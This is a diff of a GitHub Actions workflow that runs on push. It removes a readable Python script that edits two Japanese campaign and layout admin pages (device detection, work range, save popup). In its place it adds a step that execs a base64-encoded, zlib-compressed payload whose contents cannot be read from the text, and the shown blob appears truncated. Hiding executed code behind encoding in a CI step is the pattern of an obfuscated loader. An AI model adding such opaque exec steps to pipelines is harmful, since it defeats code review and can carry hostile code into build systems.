@@ -1,4 +1,4 @@
-name: Temporary edit/admin UI update
+name: Temporary edit admin UI update
 on:
   push:
     paths:
@@ -10,175 +10,15 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Patch requested UI and workflow
-        run: |
-          python - <<'PY'
-          from pathlib import Path
-          import re
-
-          edit_path=Path('home-layout-edit.html')
-          admin_path=Path('home-layout-admin.html')
-          edit=edit_path.read_text()
-          admin=admin_path.read_text()
-
-          # --- EDIT PAGE: section 1 reordered and simplified ---
-          start='''  <section class="panel cut">\n    <h1 class="panelTitle">1. 端末とデータ</h1>'''
-          end='''\n\n  <section class="panel cut">\n    <h2 class="panelTitle">2. 解析</h2>'''
-          a=edit.find(start); b=edit.find(end,a)
-          assert a!=-1 and b!=-1, 'edit section 1 not found'
-          new1='''  <section class="panel cut">\n    <h1 class="panelTitle">1. 作業範囲</h1>\n    <div class="grid">\n      <div class="workGrid">\n        <div class="field"><span class="label">作業対象</span><div class="choiceRow">\n          <label class="choice"><input type="radio" name="workTarget" value="default" checked>デフォルト<br>配置</label>\n          <label class="choice"><input type="radio" name="workTarget" value="additional">追加<br>ページ</label>\n        </div></div>\n        <div class="field"><span class="label">作業範囲</span>\n          <div id="rangeDefault" class="rangeRow"><input id="rangeStart" type="number" min="1" inputmode="numeric" placeholder="開始"><span>～</span><input id="rangeEnd" type="number" min="1" inputmode="numeric" placeholder="終了"></div>\n          <div id="rangeAdditional" class="displayField twoLine" hidden>追加<br>ページ</div>\n        </div>\n      </div>\n      <div class="field"><span class="label">キャンペーン</span><div id="campaignDisplay" class="displayField">未設定</div><select id="campaignSelect" class="hiddenCompat"></select></div>\n      <div class="field"><span class="label">除外対象</span><div class="choiceRow">\n        <label class="choice"><input type="radio" name="drawResult" value="winner">当選</label>\n        <label class="choice"><input type="radio" name="drawResult" value="loser" checked>ハズレ</label>\n      </div></div>\n      <label class="field"><span class="label">抽選後データ</span><select id="afterFile"></select></label>\n    </div>\n    <div class="hiddenCompat" aria-hidden="true">\n      <select id="device"></select>\n      <select id="baseFile"></select>\n      <button id="pinBase" type="button"></button>\n      <span id="baseMark"></span>\n    </div>\n    <p class="hint">初期データは端末ごとに事前登録済みの固定データを使用します。</p>\n  </section>'''
-          edit=edit[:a]+new1+edit[b:]
-
-          # CSS additions
-          css_anchor='.warning{border-color:#ff5b5b!important;color:#ffb0b0!important;white-space:pre-line}'
-          css_add='''.warning{border-color:#ff5b5b!important;color:#ffb0b0!important;white-space:pre-line}\n.hiddenCompat{display:none!important}.displayField{min-height:48px;padding:8px 10px;border:2px solid #fff;background:#000;color:#fff;display:grid;place-items:center;text-align:center}.twoLine{line-height:1.25}.saveToast{position:fixed;inset:0;z-index:1400;display:none;place-items:center;background:rgba(0,0,0,.45);padding:20px}.saveToast.show{display:grid}.saveToastBox{width:min(390px,92vw);padding:28px 18px;border:3px solid #fff;background:#000;color:#fff;text-align:center;font-size:20px;clip-path:polygon(7px 0,calc(100% - 7px) 0,100% 7px,100% calc(100% - 7px),calc(100% - 7px) 100%,7px 100%,0 calc(100% - 7px),0 7px)}.button.blankAction:disabled{border-color:#555;color:transparent;background:#000;opacity:.55}'''
-          assert css_anchor in edit
-          edit=edit.replace(css_anchor,css_add,1)
-
-          # Section 2 / 3 labels and buttons
-          edit=edit.replace('''<div class="analysisRow"><button id="analyze" class="button" type="button">7段目のLINEを<br>確認する</button><div id="analysisStatus" class="analysisMessage" aria-live="polite"></div></div>''','''<div class="analysisRow"><button id="analyze" class="button" type="button">除外対象を確認</button><div id="analysisStatus" class="analysisMessage" aria-live="polite"></div></div>''',1)
-          edit=edit.replace('''<h2 class="panelTitle">3. 作成</h2>''','''<h2 class="panelTitle">3. 更新ファイルの作成</h2>''',1)
-          old_actions='''<div class="createActions"><button id="generate" class="button" type="button" disabled>更新ファイルを<br>作成する</button><button id="completeWork" class="button danger" type="button">作業完了<br>使用データ削除</button></div>'''
-          new_actions='''<div class="createActions"><button id="generate" class="button" type="button" disabled>更新ファイルを<br>作成する</button><button id="completeWork" class="button danger blankAction" type="button" disabled aria-label="一時保存データ削除"></button></div>'''
-          assert old_actions in edit
-          edit=edit.replace(old_actions,new_actions,1)
-          modal='''<div id="confirmModal" class="confirmModal" aria-hidden="true"><div class="confirmBox" role="dialog" aria-modal="true"><div><div id="confirmTitle" class="confirmTitle"></div><div id="confirmMessage" class="confirmMessage"></div></div><div class="confirmActions"><button id="confirmCancel" type="button">キャンセル</button><button id="confirmOk" type="button">OK</button></div></div></div>'''
-          assert modal in edit
-          edit=edit.replace(modal,modal+'''\n<div id="saveToast" class="saveToast" aria-hidden="true"><div class="saveToastBox">ファイルを保存しました。</div></div>''',1)
-
-          # State helpers: generate button + cleanup + 3-sec popup
-          old_reset="function resetGenerateButton(){output=null;const button=$('generate');if(!button)return;button.innerHTML='更新ファイルを<br>作成する';button.classList.remove('download');button.disabled=true}"
-          new_reset="""function resetCleanupButton(){const button=$('completeWork');if(!button)return;button.disabled=true;button.innerHTML='';button.classList.add('blankAction')}\nfunction revealCleanupButton(){const button=$('completeWork');if(!button)return;button.innerHTML='初期データ以外<br>一時保存データを削除';button.disabled=false;button.classList.remove('blankAction')}\nfunction showSaveToast(){const toast=$('saveToast');toast.classList.add('show');toast.setAttribute('aria-hidden','false');setTimeout(()=>{toast.classList.remove('show');toast.setAttribute('aria-hidden','true');revealCleanupButton()},3000)}\nfunction resetGenerateButton(){output=null;const button=$('generate');if(!button)return;button.innerHTML='更新ファイルを<br>作成する';button.classList.remove('download');button.disabled=true;resetCleanupButton()}"""
-          assert old_reset in edit
-          edit=edit.replace(old_reset,new_reset,1)
-
-          # Work mode display synced to managed settings
-          needle="function selectedWorkTarget(){return document.querySelector('input[name=\"workTarget\"]:checked')?.value||'default'}"
-          insert=needle+"""\nfunction syncWorkModeUI(){\n  const additional=selectedWorkTarget()==='additional';\n  const rangeDefault=$('rangeDefault'),rangeAdditional=$('rangeAdditional'),campaignDisplay=$('campaignDisplay');\n  if(rangeDefault)rangeDefault.hidden=additional;if(rangeAdditional)rangeAdditional.hidden=!additional;\n  const selected=$('campaignSelect')?.selectedOptions?.[0];\n  if(campaignDisplay)campaignDisplay.textContent=additional?'追加ページ':(selected?.textContent||'未設定');\n}"""
-          assert needle in edit
-          edit=edit.replace(needle,insert,1)
-          apply_tail="document.querySelectorAll('input[name=\"drawResult\"],input[name=\"workTarget\"]').forEach(el=>{el.disabled=true;el.closest('.choice')?.setAttribute('title','管理画面の一括設定を使用中');});\n}"
-          assert apply_tail in edit
-          edit=edit.replace(apply_tail,apply_tail[:-2]+"  syncWorkModeUI();\n}\n",1)
-
-          # Automatic device detection based on best overlap with pinned initial data.
-          analyze_marker='async function analyze(){'
-          assert analyze_marker in edit
-          detector=r'''async function detectDeviceFromAfter(){
-  const after=selectRecord($('afterFile').value);if(!after)throw new Error('抽選後データを選択してください。');
-  const settings=migrateSettings(getSettings());
-  const assigned=Object.keys(settings.fileDevices?.[after.id]||{}).filter(device=>settings.devices?.[device]?.pinnedBaseFile);
-  let detected=assigned.length===1?assigned[0]:'';
-  if(!detected){
-    const openedAfter=await openNova(after);const afterRows=query(openedAfter.db,'SELECT * FROM favorites');
-    const afterSet=new Set(afterRows.filter(row=>Number(row.itemType)===0&&isLine(row)).map(row=>packageId(row.intent)).filter(Boolean));openedAfter.db.close();
-    const scores=[];
-    for(const [device,data] of Object.entries(settings.devices||{})){
-      const base=selectRecord(data.pinnedBaseFile);if(!base)continue;
-      const openedBase=await openNova(base);const baseRows=query(openedBase.db,'SELECT * FROM favorites');
-      const baseSet=new Set(baseRows.filter(row=>Number(row.itemType)===0&&isLine(row)).map(row=>packageId(row.intent)).filter(Boolean));openedBase.db.close();
-      let score=0;for(const id of baseSet)if(afterSet.has(id))score++;scores.push({device,score});
-    }
-    scores.sort((a,b)=>b.score-a.score||a.device.localeCompare(b.device));
-    if(scores[0]?.score>0&&(scores.length===1||scores[0].score>scores[1].score))detected=scores[0].device;
-  }
-  if(!detected)throw new Error('端末を自動判別できません。端末ごとの初期データを確認してください。');
-  $('device').value=detected;
-  const current=settings.devices?.[detected]||{};const pinned=current.pinnedBaseFile||current.baseFile;
-  if(!pinned)throw new Error('端末'+detected+'の初期データがありません。');
-  fillSelect($('baseFile'),pinned,pinned);$('baseFile').value=pinned;
-  settings.device=detected;settings.devices=settings.devices||{};settings.devices[detected]={...current,baseFile:pinned,selectedBaseFile:pinned,afterFile:after.id};assignFile(settings,after.id,detected);saveSettings(settings);renderBaseState();
-  return detected;
-}
-
-'''
-          edit=edit.replace(analyze_marker,detector+analyze_marker,1)
-
-          # Analyze: select after first, detect device, then use that device's pinned base.
-          old_analyze_head="""  const campaign=currentCampaign();\n  const base=selectRecord($('baseFile').value);\n  const after=selectRecord($('afterFile').value);\n  if(!campaign)return showStatus($('analysisStatus'),'キャンペーン名を入力してください。','error');\n  if(!base||!after)return showStatus($('analysisStatus'),'初期データと抽選後データを選択してください。','error');\n  const pinnedId=currentDeviceSettings().pinnedBaseFile;"""
-          new_analyze_head="""  const campaign=currentCampaign();\n  const after=selectRecord($('afterFile').value);\n  if(!campaign)return showStatus($('analysisStatus'),'キャンペーン設定がありません。管理画面の作業一括設定を確認してください。','error');\n  if(!after)return showStatus($('analysisStatus'),'抽選後データを選択してください。','error');\n  try{await detectDeviceFromAfter()}catch(error){return showStatus($('analysisStatus'),String(error?.message||error),'error')}\n  const base=selectRecord($('baseFile').value);\n  if(!base)return showStatus($('analysisStatus'),'自動判別した端末の初期データがありません。','error');\n  const pinnedId=currentDeviceSettings().pinnedBaseFile;"""
-          assert old_analyze_head in edit
-          edit=edit.replace(old_analyze_head,new_analyze_head,1)
-
-          old_range="""    const start=Number($('rangeStart').value);\n    const end=Number($('rangeEnd').value);\n    if(!Number.isInteger(start)||!Number.isInteger(end)||start<1||end<start)throw new Error('作業範囲の開始番号と終了番号を正しく入力してください。');\n    const workTarget=selectedWorkTarget();"""
-          new_range="""    const workTarget=selectedWorkTarget();\n    let start=Number($('rangeStart').value);\n    let end=Number($('rangeEnd').value);\n    if(workTarget==='default'&&(!Number.isInteger(start)||!Number.isInteger(end)||start<1||end<start))throw new Error('作業範囲の開始番号と終了番号を正しく入力してください。');"""
-          assert old_range in edit
-          edit=edit.replace(old_range,new_range,1)
-          additional_line="""      const availableCount=additionalIds.length;\n      if(start>availableCount)throw new Error(campaign+'の追加ページ対象は'+availableCount+'件です。指定開始 '+start+' は対象外です。');"""
-          additional_new="""      const availableCount=additionalIds.length;\n      start=1;end=availableCount;\n      if(!availableCount)throw new Error(campaign+'の追加ページ対象がありません。');"""
-          assert additional_line in edit
-          edit=edit.replace(additional_line,additional_new,1)
-
-          # Analysis right result: success / failure heading.
-          old_show="""function showStatus(target,text,type='ok'){\n  target.textContent=text;\n  target.className=(target.id==='analysisStatus'?'analysisMessage':'status')+' show '+type;\n}"""
-          new_show="""function showStatus(target,text,type='ok'){\n  if(target.id==='analysisStatus')target.textContent=(type==='error'?'失敗':'成功')+(text?'\\n'+text:'');else target.textContent=text;\n  target.className=(target.id==='analysisStatus'?'analysisMessage':'status')+' show '+type;\n}"""
-          assert old_show in edit
-          edit=edit.replace(old_show,new_show,1)
-
-          # Generated file button becomes save button.
-          old_success="$('generate').disabled=false;$('generate').classList.add('download');$('generate').innerHTML=escapeHtml(record.campaign)+'の<br>更新ファイルをダウンロード';"
-          new_success="$('generate').disabled=false;$('generate').classList.add('download');$('generate').innerHTML='ファイルを<br>保存する';"
-          assert old_success in edit
-          edit=edit.replace(old_success,new_success,1)
-
-          # Saving no longer auto-cleans. Show 3-second popup, then reveal cleanup button.
-          click_start="$('generate').addEventListener('click',async()=>{"
-          click_end="\n$('pinBase').addEventListener('click',pinInitialFile);"
-          a=edit.find(click_start); b=edit.find(click_end,a); assert a!=-1 and b!=-1
-          new_click=r'''$('generate').addEventListener('click',async()=>{
-  if(output){
-    const downloaded=output;
-    download(downloaded.blob,downloaded.fileName);
-    apiCall('/api/layout/generations',{method:'POST',body:JSON.stringify({id:downloaded.id,device:downloaded.device,campaign_id:downloaded.campaignId||null,file_name:downloaded.fileName,account_count:(downloaded.pages||[]).reduce((sum,page)=>sum+page.count,0),downloaded:true})}).catch(console.error);
-    output=null;$('generate').disabled=true;
-    showSaveToast();
-    return;
-  }
-  generate();
-});'''
-          edit=edit[:a]+new_click+edit[b:]
-
-          # Keep work-mode display in sync.
-          event_anchor="$'"  # placeholder never used
-          end_anchor="$('analyze').addEventListener('click',analyze);"
-          assert end_anchor in edit
-          edit=edit.replace(end_anchor,"document.querySelectorAll('input[name=\"workTarget\"]').forEach(el=>el.addEventListener('change',syncWorkModeUI));\nsyncWorkModeUI();\n"+end_anchor,1)
-
-          edit_path.write_text(edit)
-
-          # --- ADMIN PAGE: bulk setting becomes default and follows same order ---
-          old_bulk='''<section id="bulk" class="panel cut"><h2>作業一括設定</h2>\n  <div class="gridBulk">\n    <label class="fieldBulk"><span class="muted">キャンペーン</span><select id="bulkCampaign"></select></label>\n    <div class="fieldBulk"><span class="muted">7段目の結果</span><div class="bulkChoices"><label><input type="radio" name="bulkResult" value="winner"> 当選</label><label><input type="radio" name="bulkResult" value="loser" checked> ハズレ</label></div></div>\n    <div class="fieldBulk"><span class="muted">作業対象</span><div class="bulkChoices"><label><input type="radio" name="bulkTarget" value="default" checked> デフォルト配置</label><label><input type="radio" name="bulkTarget" value="additional"> 追加ページ</label></div></div>\n    <label class="fieldBulk"><span class="muted">作業範囲</span><div class="rangeBulk"><input id="bulkStart" type="number" min="1" value="1" inputmode="numeric"><span>～</span><input id="bulkEnd" type="number" min="1" value="150" inputmode="numeric"></div></label>\n  </div>'''
-          new_bulk='''<section id="bulk" class="panel cut show"><h2>作業一括設定</h2>\n  <div class="gridBulk">\n    <div class="fieldBulk"><span class="muted">作業対象</span><div class="bulkChoices"><label><input type="radio" name="bulkTarget" value="default" checked> デフォルト配置</label><label><input type="radio" name="bulkTarget" value="additional"> 追加ページ</label></div></div>\n    <div class="fieldBulk"><span class="muted">作業範囲</span><div id="bulkRangeDefault" class="rangeBulk"><input id="bulkStart" type="number" min="1" value="1" inputmode="numeric"><span>～</span><input id="bulkEnd" type="number" min="1" value="150" inputmode="numeric"></div><div id="bulkRangeAdditional" class="bulkStatic" hidden>追加<br>ページ</div></div>\n    <label class="fieldBulk"><span class="muted">キャンペーン</span><select id="bulkCampaign"></select><div id="bulkCampaignAdditional" class="bulkStatic" hidden>追加ページ</div></label>\n    <div class="fieldBulk"><span class="muted">除外対象</span><div class="bulkChoices"><label><input type="radio" name="bulkResult" value="winner"> 当選</label><label><input type="radio" name="bulkResult" value="loser" checked> ハズレ</label></div></div>\n  </div>'''
-          assert old_bulk in admin
-          admin=admin.replace(old_bulk,new_bulk,1)
-          admin=admin.replace('<section id="accounts" class="panel cut show">','<section id="accounts" class="panel cut">',1)
-          admin=admin.replace('<button data-panel="bulk">作業一括設定</button>','<button data-panel="bulk" class="active">作業一括設定</button>',1)
-          admin_css='.rangeBulk input{text-align:center;width:100%;min-width:0;max-width:100%} .fieldBulk select{width:100%}'
-          admin_css_new=admin_css+'.bulkStatic{min-height:48px;border:2px solid #fff;display:grid;place-items:center;text-align:center;line-height:1.25;padding:6px}.bulkStatic[hidden]{display:none!important}'
-          assert admin_css in admin
-          admin=admin.replace(admin_css,admin_css_new,1)
-
-          old_apply="function applyBulkForm(){const s=bulkSettings||{};const r=document.querySelector('input[name=\"bulkResult\"][value=\"'+(s.draw_result||'loser')+'\"]');if(r)r.checked=true;const t=document.querySelector('input[name=\"bulkTarget\"][value=\"'+(s.work_target||'default')+'\"]');if(t)t.checked=true;$('bulkStart').value=Number(s.range_start||1);$('bulkEnd').value=Number(s.range_end||150);if(s.campaign_id&&data.campaigns.some(row=>row.id===s.campaign_id))$('bulkCampaign').value=s.campaign_id;$('bulkState').textContent=s.updated_at?'現在の共通設定を読み込み済み：'+new Date(s.updated_at).toLocaleString('ja-JP'):'';}"
-          new_apply="""function syncBulkModeUI(){const additional=(document.querySelector('input[name=\"bulkTarget\"]:checked')?.value||'default')==='additional';$('bulkRangeDefault').hidden=additional;$('bulkRangeAdditional').hidden=!additional;$('bulkCampaign').hidden=additional;$('bulkCampaignAdditional').hidden=!additional;}\nfunction applyBulkForm(){const s=bulkSettings||{};const r=document.querySelector('input[name=\"bulkResult\"][value=\"'+(s.draw_result||'loser')+'\"]');if(r)r.checked=true;const t=document.querySelector('input[name=\"bulkTarget\"][value=\"'+(s.work_target||'default')+'\"]');if(t)t.checked=true;$('bulkStart').value=Number(s.range_start||1);$('bulkEnd').value=Number(s.range_end||150);if(s.campaign_id&&data.campaigns.some(row=>row.id===s.campaign_id))$('bulkCampaign').value=s.campaign_id;$('bulkState').textContent=s.updated_at?'現在の共通設定を読み込み済み：'+new Date(s.updated_at).toLocaleString('ja-JP'):'';syncBulkModeUI();}"""
-          assert old_apply in admin
-          admin=admin.replace(old_apply,new_apply,1)
-
-          old_save="$('bulkSave').onclick=async()=>{const campaign_id=$('bulkCampaign').value,draw_result=document.querySelector('input[name=\"bulkResult\"]:checked')?.value||'loser',work_target=document.querySelector('input[name=\"bulkTarget\"]:checked')?.value||'default',range_start=Number($('bulkStart').value),range_end=Number($('bulkEnd').value);if(!campaign_id)return status('キャンペーンを選択してください。');if(!Number.isInteger(range_start)||!Number.isInteger(range_end)||range_start<1||range_end<range_start)return status('作業範囲を正しく入力してください。');const res=await call('/api/layout/settings',{method:'POST',body:JSON.stringify({campaign_id,draw_result,work_target,range_start,range_end})});bulkSettings=res.settings;applyBulkForm();status('作業一括設定を保存しました。以後、各端末の編集画面で都度この設定を取得します。');};"
-          new_save="""$('bulkSave').onclick=async()=>{const work_target=document.querySelector('input[name=\"bulkTarget\"]:checked')?.value||'default',draw_result=document.querySelector('input[name=\"bulkResult\"]:checked')?.value||'loser';let campaign_id=$('bulkCampaign').value||bulkSettings?.campaign_id||data.campaigns.find(row=>row.status==='active')?.id||'';let range_start=Number($('bulkStart').value),range_end=Number($('bulkEnd').value);if(work_target==='default'){if(!campaign_id)return status('キャンペーンを選択してください。');if(!Number.isInteger(range_start)||!Number.isInteger(range_end)||range_start<1||range_end<range_start)return status('作業範囲を正しく入力してください。')}else{range_start=1;range_end=150;if(!campaign_id)return status('追加ページ判定に使うキャンペーン履歴がありません。')}const res=await call('/api/layout/settings',{method:'POST',body:JSON.stringify({campaign_id,draw_result,work_target,range_start,range_end})});bulkSettings=res.settings;applyBulkForm();status('作業一括設定を保存しました。以後、各端末の編集画面で都度この設定を取得します。');};\ndocument.querySelectorAll('input[name=\"bulkTarget\"]').forEach(el=>el.addEventListener('change',syncBulkModeUI));"""
-          assert old_save in admin
-          admin=admin.replace(old_save,new_save,1)
-
-          old_menu="document.querySelectorAll('.menu button').forEach(button=>button.onclick=()=>{const wasActive=button.classList.contains('active');document.querySelectorAll('.menu button').forEach(item=>item.classList.remove('active'));document.querySelectorAll('.panel').forEach(panel=>panel.classList.remove('show'));if(wasActive){$('accounts').classList.add('show');return}button.classList.add('active');$(button.dataset.panel).classList.add('show')});"
-          new_menu="document.querySelectorAll('.menu button').forEach(button=>button.onclick=()=>{document.querySelectorAll('.menu button').forEach(item=>item.classList.remove('active'));document.querySelectorAll('.panel').forEach(panel=>panel.classList.remove('show'));button.classList.add('active');$(button.dataset.panel).classList.add('show')});"
-          assert old_menu in admin
-          admin=admin.replace(old_menu,new_menu,1)
-          admin_path.write_text(admin)
-          PY
-      - name: Remove temporary workflows and commit
+      - name: Apply requested changes
+        shell: bash
+        run: python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('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